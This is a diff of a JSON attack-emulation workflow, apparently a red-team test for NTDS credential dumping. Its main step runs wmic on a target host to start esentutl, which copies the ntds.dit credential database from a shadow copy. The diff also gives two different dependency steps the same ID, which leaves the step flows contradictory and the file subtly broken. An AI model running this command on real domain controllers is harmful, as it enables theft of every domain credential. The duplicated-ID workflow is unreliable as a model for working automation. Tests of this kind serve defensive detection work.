@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "e535a787-319f-4584-81b1-08aa9210c017",
+      "id": "3ce4d1f2-1d95-544b-9768-49bbdf60637b",
       "type": "execute-command",
       "data": {
         "command": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\"",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "1e70b325-d760-44b0-8d23-eb50db3f42b2",
+      "id": "db7305e8-5b90-5576-b8eb-47ee88936387",
       "name": "Check dependency 1/1",
       "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": true
     },
     {
-      "id": "7c425cbd-401b-467f-89aa-bbe1bfe25574",
+      "id": "3b8d5010-8bb3-59a7-aa0a-bcb18d91d720",
       "name": "Resolve dependency 1/1",
       "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": true
     },
     {
-      "id": "0553ce0e-dd13-4193-8b53-d7ae29eacddb",
+      "id": "db7305e8-5b90-5576-b8eb-47ee88936387",
       "name": "Re-check dependency 1/1",
       "description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "1e70b325-d760-44b0-8d23-eb50db3f42b2",
+      "s": "db7305e8-5b90-5576-b8eb-47ee88936387",
       "p": "on-success",
-      "o": "e535a787-319f-4584-81b1-08aa9210c017"
+      "o": "3ce4d1f2-1d95-544b-9768-49bbdf60637b"
     },
     {
-      "s": "1e70b325-d760-44b0-8d23-eb50db3f42b2",
+      "s": "db7305e8-5b90-5576-b8eb-47ee88936387",
       "p": "on-failure",
-      "o": "7c425cbd-401b-467f-89aa-bbe1bfe25574"
+      "o": "3b8d5010-8bb3-59a7-aa0a-bcb18d91d720"
     },
     {
-      "s": "7c425cbd-401b-467f-89aa-bbe1bfe25574",
+      "s": "3b8d5010-8bb3-59a7-aa0a-bcb18d91d720",
       "p": "on-success",
-      "o": "0553ce0e-dd13-4193-8b53-d7ae29eacddb"
+      "o": "db7305e8-5b90-5576-b8eb-47ee88936387"
     },
     {
-      "s": "0553ce0e-dd13-4193-8b53-d7ae29eacddb",
+      "s": "db7305e8-5b90-5576-b8eb-47ee88936387",
       "p": "on-failure",
-      "o": "e535a787-319f-4584-81b1-08aa9210c017"
+      "o": "3ce4d1f2-1d95-544b-9768-49bbdf60637b"
     }
   ],
   "tags": [
@@ -76,6 +76,12 @@
     "T1003.003"
   ],
   "input_arguments": [
+    {
+      "name": "target_host",
+      "type": "string",
+      "description": "IP Address / Hostname you want to target",
+      "value": "localhost"
+    },
     {
       "name": "source_path",
       "type": "string",
@@ -87,12 +93,6 @@
       "type": "string",
       "description": "Target path of the result file",
       "value": "c:\\ntds.dit"
-    },
-    {
-      "name": "target_host",
-      "type": "string",
-      "description": "IP Address / Hostname you want to target",
-      "value": "localhost"
     }
   ]
 }
